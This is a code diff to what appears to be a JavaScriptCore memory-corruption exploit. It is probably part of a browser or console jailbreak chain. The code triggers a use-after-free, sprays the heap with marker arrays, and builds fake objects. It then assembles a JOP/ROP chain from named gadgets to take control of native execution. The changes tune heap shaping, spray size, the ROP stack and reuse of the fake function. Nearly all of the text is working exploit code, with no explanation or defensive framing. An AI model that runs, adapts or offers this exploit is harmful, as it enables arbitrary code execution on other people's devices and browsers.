@@ -426,6 +426,9 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
+//include('globals.js')
+//include('util.js')
+
 DataView.prototype.getBigInt = function (byteOffset, littleEndian) {
   littleEndian = (typeof littleEndian === 'undefined') ? false : littleEndian
 
@@ -709,6 +712,11 @@ for (var i = 0; i < u32_structs.length; i++) {
 
 log('Initiate UAF...')
 
+// Pre-shape heap with small allocations
+for (var pre = 0; pre < 0x100; pre++) {
+  var tmp = new Uint32Array(0x10)
+}
+
 var uaf_arr = new Uint32Array(0x40000)
 
 // fake m_hashAndFlags
@@ -718,9 +726,12 @@ make_uaf(uaf_arr)
 
 log('Achieved UAF !!')
 
+// Small delay before spray
+for (var d = 0; d < 1000; d++) {}
+
 log('Spraying arrays with marker...')
-// spray candidates arrays to be used as leak primitive
-var spray = new Array(0x800)
+// spray candidates arrays to be used as leak primitive (increased from 0x800)
+var spray = new Array(0x1000)
 for (var i = 0; i < spray.length; i++) {
     spray[i] = [marker.jsv(), {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
 }
@@ -1026,17 +1037,18 @@ var rop = {
   jop_stack_addr: undefined,
   stack_addr: undefined,
   fake: undefined,
+  fake_func: null,
   init: function () {
     log('Initiate ROP...')
 
     rop.jop_stack_store = mem.malloc(8)
     rop.jop_stack_addr = mem.malloc(0x6A)
-    rop.stack_addr = mem.malloc(rop.base * 2)
+    rop.stack_addr = mem.malloc(0x5000)
 
     var jop_stack_base_addr = rop.jop_stack_addr.add(0x22)
 
     mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
-    mem.write8(jop_stack_base_addr, rop.stack_addr.add(rop.base))
+    mem.write8(jop_stack_base_addr, rop.stack_addr)
     mem.write8(jop_stack_base_addr.add(0x10), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
     mem.write8(jop_stack_base_addr.add(0x18), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
     mem.write8(jop_stack_base_addr.add(0x40), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)
@@ -1057,11 +1069,11 @@ var rop = {
     rop.idx = rop.base
   },
   push: function (val) {
-    if (rop.idx > rop.base * 2) {
+    if (rop.idx > 0x5000) {
       throw new Error('Stack full !!')
     }
 
-    mem.write8(rop.stack_addr.add(rop.idx), val)
+    mem.write8(rop.stack_addr.add(new BigInt(0, rop.idx)), val)
     rop.idx += 8
   },
   execute: function (insts, store_addr, store_size) {
@@ -1072,6 +1084,9 @@ var rop = {
     if (store_size < 8) {
       throw new Error('Invalid store, minimal size is 8 to store RSP')
     }
+
+    // Reset index but don't zero memory - JSC may reference it
+    rop.idx = 0
 
     var header = []
 
@@ -1084,18 +1099,38 @@ var rop = {
     rop.load(footer, store_addr, 0)
     footer.push(gadgets.PUSH_RAX_POP_RBP_RET)
     footer.push(gadgets.POP_RAX_RET)
-    footer.push(BigInt.Zero)
+    footer.push(new BigInt(0, 0xa)) // JSValue for undefined
     footer.push(gadgets.LEAVE_RET)
 
     insts = header.concat(insts).concat(footer)
 
-    for (var inst of insts) {
-      rop.push(inst)
+    for (var i = 0; i < insts.length; i++) {
+      rop.push(insts[i])
     }
 
-    rop.fake(0, 0, 0, mem.fakeobj(rop.jop_stack_store))
+    // Reuse pre-allocated JOP structures
+    var jop_stack_base_addr = rop.jop_stack_addr.add(new BigInt(0, 0x22))
 
-    rop.reset()
+    mem.write8(rop.jop_stack_addr, gadgets.POP_RSP_RET)
+    mem.write8(jop_stack_base_addr, rop.stack_addr)
+    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x10)), gadgets.PUSH_RDX_CLC_JMP_QWORD_PTR_RAX_NEG_22)
+    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x18)), gadgets.MOV_RDX_QWORD_PTR_RAX_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_10)
+    mem.write8(jop_stack_base_addr.add(new BigInt(0, 0x40)), gadgets.PUSH_RBP_MOV_RBP_RSP_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_18)
+
+    mem.write8(rop.jop_stack_store, jop_stack_base_addr)
+
+    // Create fake function only once
+    if (rop.fake_func === null) {
+      rop.fake_func = rop.fake_builtin(gadgets.MOV_RDI_QWORD_PTR_RDI_48_MOV_RAX_QWORD_PTR_RDI_JMP_QWORD_PTR_RAX_40)
+    }
+
+    rop.fake_func(0, 0, 0, mem.fakeobj(rop.jop_stack_store))
+
+    // Restore leak_obj to valid state - JSC may access it
+    leak_obj.obj = {}
+
+    // Don't free - structures are reused across executions
+    // Don't clear ROP stack either - JSC may still reference it
   },
   fake_builtin: function (addr) {
     function fake () {}
